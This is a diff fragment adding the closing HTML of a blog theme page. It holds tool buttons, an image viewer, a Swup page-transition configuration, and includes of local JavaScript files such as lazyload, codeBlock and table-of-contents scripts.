+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
